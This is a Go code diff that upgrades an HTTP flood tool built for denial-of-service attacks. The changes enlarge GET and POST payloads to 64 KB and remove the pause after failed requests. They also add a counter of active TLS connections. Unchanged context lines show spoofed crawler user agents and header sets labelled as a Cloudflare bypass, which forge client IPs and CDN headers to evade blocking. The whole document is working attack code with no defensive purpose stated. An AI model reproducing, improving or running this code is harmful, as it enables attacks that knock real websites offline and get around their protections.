@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io"
 	"math/rand"
+	"net"
 	"net/http"
 	"net/url"
 	"os"
@@ -30,6 +31,7 @@ var (
 	keepAlive       = true
 	attackRunning   = true
 	key             string
+	connCount       int32
 
 	acceptall = []string{
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -73,104 +75,111 @@ var (
 	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
 	spider = []string{
 		"AdsBot-Google (+http://www.google.com/adsbot.html)",
-    "Baiduspider (+http://www.baidu.com/search/spider.htm)",
-    "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",
-    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
-    "Googlebot-Image/1.0",
-    "Googlebot-News",
-    "Googlebot-Video/1.0",
-    "Applebot/0.1 (+http://www.apple.com/go/applebot)",
-    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
-    "Slurp (+http://help.yahoo.com/help/us/ysearch/slurp)",
-    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
-    "YandexBot/3.0 (+http://yandex.com/bots)",
-    "YandexImages/3.0 (+http://yandex.com/bots)",
-    "AhrefsBot/7.0 (+http://ahrefs.com/robot/)",
-    "SemrushBot (+http://www.semrush.com/bot.html)",
-    "MJ12bot/v1.4.8 (+http://mj12bot.com/)",
-    "DotBot (+http://www.opensiteexplorer.org/dotbot)",
-    "PetalBot (+https://webmaster.petalsearch.com/site/petalbot)",
-    "Facebot (+http://www.facebook.com/externalhit_uatext.php)",
-    "Twitterbot/1.0",
+		"Baiduspider (+http://www.baidu.com/search/spider.htm)",
+		"FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",
+		"Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
+		"Googlebot-Image/1.0",
+		"Googlebot-News",
+		"Googlebot-Video/1.0",
+		"Applebot/0.1 (+http://www.apple.com/go/applebot)",
+		"Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
+		"Slurp (+http://help.yahoo.com/help/us/ysearch/slurp)",
+		"DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
+		"YandexBot/3.0 (+http://yandex.com/bots)",
+		"YandexImages/3.0 (+http://yandex.com/bots)",
+		"AhrefsBot/7.0 (+http://ahrefs.com/robot/)",
+		"SemrushBot (+http://www.semrush.com/bot.html)",
+		"MJ12bot/v1.4.8 (+http://mj12bot.com/)",
+		"DotBot (+http://www.opensiteexplorer.org/dotbot)",
+		"PetalBot (+https://webmaster.petalsearch.com/site/petalbot)",
+		"Facebot (+http://www.facebook.com/externalhit_uatext.php)",
+		"Twitterbot/1.0",
 	}
 
 	payloads = []string{
-		"?" + strings.Repeat("x", 2048),
-		"?" + strings.Repeat("y", 4096),
-		"?" + strings.Repeat("z", 8192),
-		"?" + strings.Repeat("a", 16384),
+		"?" + strings.Repeat("x", 65536),
+		"?" + strings.Repeat("y", 65536),
+		"?" + strings.Repeat("z", 65536),
+		"?" + strings.Repeat("a", 65536),
+	}
+
+	postPayloads = [][]byte{
+		[]byte(strings.Repeat("x", 65536)),
+		[]byte(strings.Repeat("y", 65536)),
+		[]byte(strings.Repeat("z", 65536)),
+		[]byte(strings.Repeat("a", 65536)),
 	}
 
 	cloudflareBypassHeaders = []map[string]string{
 		{
-			"CF-Connecting-IP":       "1.1.1.1",
-			"X-Forwarded-For":        "1.1.1.1",
-			"True-Client-IP":         "1.1.1.1",
-			"X-Real-IP":              "1.1.1.1",
-			"X-Client-IP":            "1.1.1.1",
-			"X-Originating-IP":       "1.1.1.1",
-			"X-Forwarded-Host":       "google.com",
-			"X-Host":                 "google.com",
-			"X-Forwarded-Proto":      "https",
-			"X-Forwarded-Protocol":   "https",
-			"X-Url-Scheme":           "https",
-			"X-Forwarded-Ssl":        "on",
-			"X-Forwarded-Port":       "443",
-			"X-Forwarded-By":         "nginx",
-			"X-Forwarded-Server":     "google.com",
-			"X-Forwarded-Scheme":     "https",
-			"X-Forwarded-Forwarded-For": "1.1.1.1",
+			"CF-Connecting-IP":             "1.1.1.1",
+			"X-Forwarded-For":              "1.1.1.1",
+			"True-Client-IP":               "1.1.1.1",
+			"X-Real-IP":                    "1.1.1.1",
+			"X-Client-IP":                  "1.1.1.1",
+			"X-Originating-IP":             "1.1.1.1",
+			"X-Forwarded-Host":             "google.com",
+			"X-Host":                       "google.com",
+			"X-Forwarded-Proto":            "https",
+			"X-Forwarded-Protocol":         "https",
+			"X-Url-Scheme":                 "https",
+			"X-Forwarded-Ssl":              "on",
+			"X-Forwarded-Port":             "443",
+			"X-Forwarded-By":               "nginx",
+			"X-Forwarded-Server":           "google.com",
+			"X-Forwarded-Scheme":           "https",
+			"X-Forwarded-Forwarded-For":    "1.1.1.1",
 		},
 		{
-			"CF-Connecting-IP":       "8.8.8.8",
-			"X-Forwarded-For":        "8.8.8.8",
-			"True-Client-IP":         "8.8.8.8",
-			"X-Real-IP":              "8.8.8.8",
-			"X-Client-IP":            "8.8.8.8",
-			"X-Originating-IP":       "8.8.8.8",
-			"X-Forwarded-Host":       "cloudflare.com",
-			"X-Host":                 "cloudflare.com",
-			"X-Forwarded-Proto":      "https",
-			"X-Forwarded-Protocol":   "https",
-			"X-Url-Scheme":           "https",
-			"X-Forwarded-Ssl":        "on",
-			"X-Forwarded-Port":       "443",
-			"X-Forwarded-By":         "apache",
-			"X-Forwarded-Server":     "cloudflare.com",
-			"X-Forwarded-Scheme":     "https",
-			"X-Forwarded-Forwarded-For": "8.8.8.8",
+			"CF-Connecting-IP":             "8.8.8.8",
+			"X-Forwarded-For":              "8.8.8.8",
+			"True-Client-IP":               "8.8.8.8",
+			"X-Real-IP":                    "8.8.8.8",
+			"X-Client-IP":                  "8.8.8.8",
+			"X-Originating-IP":             "8.8.8.8",
+			"X-Forwarded-Host":             "cloudflare.com",
+			"X-Host":                       "cloudflare.com",
+			"X-Forwarded-Proto":            "https",
+			"X-Forwarded-Protocol":         "https",
+			"X-Url-Scheme":                 "https",
+			"X-Forwarded-Ssl":              "on",
+			"X-Forwarded-Port":             "443",
+			"X-Forwarded-By":               "apache",
+			"X-Forwarded-Server":           "cloudflare.com",
+			"X-Forwarded-Scheme":           "https",
+			"X-Forwarded-Forwarded-For":    "8.8.8.8",
 		},
 	}
 
 	forbiddenRecoveryHeaders = []map[string]string{
 		{
-			"Cache-Control":           "no-transform",
-			"CDN-Loop":                "cloudflare",
-			"CF-IPCountry":            "US",
-			"CF-Ray":                  "mock-ray-id",
-			"CF-Visitor":              `{"scheme":"https"}`,
-			"Origin":                  "null",
-			"Pragma":                  "no-cache",
-			"Sec-Fetch-Dest":          "document",
-			"Sec-Fetch-Mode":          "navigate",
-			"Sec-Fetch-Site":          "none",
-			"Sec-Fetch-User":          "?1",
-			"Upgrade-Insecure-Requests": "1",
-			"Via":                     "1.1 google",
+			"Cache-Control":                "no-transform",
+			"CDN-Loop":                     "cloudflare",
+			"CF-IPCountry":                 "US",
+			"CF-Ray":                       "mock-ray-id",
+			"CF-Visitor":                   `{"scheme":"https"}`,
+			"Origin":                       "null",
+			"Pragma":                       "no-cache",
+			"Sec-Fetch-Dest":               "document",
+			"Sec-Fetch-Mode":               "navigate",
+			"Sec-Fetch-Site":               "none",
+			"Sec-Fetch-User":               "?1",
+			"Upgrade-Insecure-Requests":    "1",
+			"Via":                          "1.1 google",
 		},
 		{
-			"Cache-Control":           "max-age=0",
-			"CDN-Loop":                "fastly",
-			"CF-IPCountry":            "GB",
-			"CF-Ray":                  "mock-ray-id-2",
-			"CF-Visitor":              `{"scheme":"http"}`,
-			"Origin":                  host,
-			"Pragma":                  "public",
-			"Sec-Fetch-Dest":          "empty",
-			"Sec-Fetch-Mode":          "cors",
-			"Sec-Fetch-Site":          "same-origin",
-			"Upgrade-Insecure-Requests": "0",
-			"Via":                     "1.1 varnish",
+			"Cache-Control":                "max-age=0",
+			"CDN-Loop":                     "fastly",
+			"CF-IPCountry":                 "GB",
+			"CF-Ray":                       "mock-ray-id-2",
+			"CF-Visitor":                   `{"scheme":"http"}`,
+			"Origin":                       host,
+			"Pragma":                       "public",
+			"Sec-Fetch-Dest":               "empty",
+			"Sec-Fetch-Mode":               "cors",
+			"Sec-Fetch-Site":               "same-origin",
+			"Upgrade-Insecure-Requests":    "0",
+			"Via":                          "1.1 varnish",
 		},
 	}
 )
@@ -190,6 +199,13 @@ func init() {
 			},
 			Renegotiation:      tls.RenegotiateOnceAsClient,
 			SessionTicketsDisabled: false,
+		},
+		DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
+			atomic.AddInt32(&connCount, 1)
+			return tls.DialWithDialer(&net.Dialer{
+				Timeout:   15 * time.Second,
+				KeepAlive: 15 * time.Second,
+			}, network, addr, cfg)
 		},
 		ReadIdleTimeout:  time.Second * 30,
 		WriteByteTimeout: time.Second * 30,
@@ -235,6 +251,10 @@ func generateRandomIP() string {
 
 func getLargePayload() string {
 	return payloads[rand.Intn(len(payloads))]
+}
+
+func getPostPayload() []byte {
+	return postPayloads[rand.Intn(len(postPayloads))]
 }
 
 func applyCloudflareBypass(req *http.Request) {
@@ -283,7 +303,7 @@ func buildRequest(targetURL string) (*http.Request, error) {
 			getLargePayload()
 		req, err = http.NewRequest("GET", fullURL, nil)
 	} else {
-		req, err = http.NewRequest("POST", targetURL, strings.NewReader(strings.Repeat("x", 8192)))
+		req, err = http.NewRequest("POST", targetURL, strings.NewReader(string(getPostPayload())))
 	}
 
 	if err != nil {
@@ -302,6 +322,8 @@ func buildRequest(targetURL string) (*http.Request, error) {
 	req.Header.Set("Upgrade-Insecure-Requests", "1")
 	req.Header.Set("DNT", "1")
 	req.Header.Set("TE", "Trailers")
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Content-Length", strconv.Itoa(len(getPostPayload())))
 
 	applyCloudflareBypass(req)
 	applyForbiddenRecovery(req)
@@ -322,8 +344,6 @@ func flood(targetURL string) {
 			io.Copy(io.Discard, resp.Body)
 			resp.Body.Close()
 			atomic.AddInt64(&counter, 1)
-		} else {
-			time.Sleep(100 * time.Millisecond)
 		}
 	}
 }
@@ -386,12 +406,16 @@ func main() {
 
 	statsTicker := time.NewTicker(1 * time.Second)
 	defer statsTicker.Stop()
+	connTicker := time.NewTicker(5 * time.Second)
+	defer connTicker.Stop()
 	timeout := time.After(time.Duration(limit) * time.Second)
 
 	for {
 		select {
 		case <-statsTicker.C:
 			fmt.Printf("\rRequests sent: %d", atomic.LoadInt64(&counter))
+		case <-connTicker.C:
+			fmt.Printf("\nActive connections: %d\n", atomic.LoadInt32(&connCount))
 		case <-timeout:
 			attackRunning = false
 			fmt.Printf("\nAttack finished. Total requests: %d\n", atomic.LoadInt64(&counter))
